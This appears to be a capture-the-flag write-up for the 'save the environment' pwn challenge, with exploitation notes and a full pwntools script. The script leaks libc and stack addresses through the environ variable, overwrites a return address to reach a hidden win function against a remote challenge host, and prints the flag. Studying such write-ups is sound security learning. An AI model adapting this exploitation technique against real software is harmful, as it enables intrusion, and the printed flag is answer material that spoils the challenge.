---
title: save the environment
date: 2021-04-23
categories: [pwn]
tags: [cyberapocalpyse2021]
toc: false
---

#### Notes:
- Binary comes with all mitigations besides PIE
- This program asks you if you want to plant or recycle
- When you select recycle, you are asked if you've recycled before, if not,
  then a global variable called rec_count is incremented. 
- After recycling 5 times, the program gives you a printf leak
- After recycling 10 times, you are able to enter an address of your own to leak using puts(strtoull(&buffer, nullptr, 0)). 
- plant() allows us to overwrite a value at an address using strtoull()
- There is a function called hidden_resources() that is basically our "win" function. The goal is to return to this function after plant(). 

#### Plan:
- Run program with a distinct environment variable (more detail in later steps)
- Recycle 5 times to get our printf leak
- Use printf leak to get content of environ variable so we can access the environment variables.
- Reycle 5 more times to get our stack leak. We can use environ to leak a pointer to our environment variable
- Using the leaked stack address we can find the offset to the return address of plant() and overwrite it with our "win" function

#### recycle():

![Snippet of recycle()](/assets/img/cyberapoc/environment/recycle.png)

#### plant():

![Snippet of plant()](/assets/img/cyberapoc/environment/plant.png)

#### form():

![Snippet of form()](/assets/img/cyberapoc/environment/form.png)

#### PoC:

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template environment
from pwn import *
import os
# Set up pwntools for the correct architecture
exe = context.binary = ELF('environment')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env={'ICEENV':'AAAAAAAAAAAAAA'})
    else:
        return process([exe.path] + argv, *a, **kw, env={'ICEENV': 'AAAAAAAAAAAAAA'})

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x401341
b *0x40149a
b *0x40147a
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

#io = start()
io = remote('178.62.14.240', 30384)
win = '0x4010b5'

def plant(addr1, addr2):
    io.recvuntil('> ')
    io.sendline('1')
    io.recvuntil('> ')
    io.sendline(addr1)
    io.recvuntil('> ')
    io.sendline(addr2)

def recycle():
    io.recvuntil('> ')
    io.sendline('2')
    io.recvuntil('> ')
    io.sendline('1')
    io.recvuntil('> ')
    io.sendline('n')


for _ in range(5):
    recycle()

io.recvuntil('gift: ')
printf_leak = int(io.recvline()[5:19], 16)
print('Printf Leak: ', hex(printf_leak))

for _ in range(5):
    recycle()

io.recvuntil('> ')

libc_base = printf_leak - 0x064f70
print('Libc base: ', hex(libc_base))

environ = libc_base + 0x3ee098

io.sendline(hex(environ))
leak = int.from_bytes(io.recvline()[4:16], 'little')
leak = '0x' + str(hex(leak))[3:16]
leak_addr = int(leak, 16)

print('Targeted environ: ', hex(environ))
print('Second Leak: ', hex(leak_addr))

rip_addr = leak_addr - 288

plant(hex(rip_addr), win)

io.interactive()

# CHTB{u_s4v3d_th3_3nv1r0n_v4r14bl3!}
```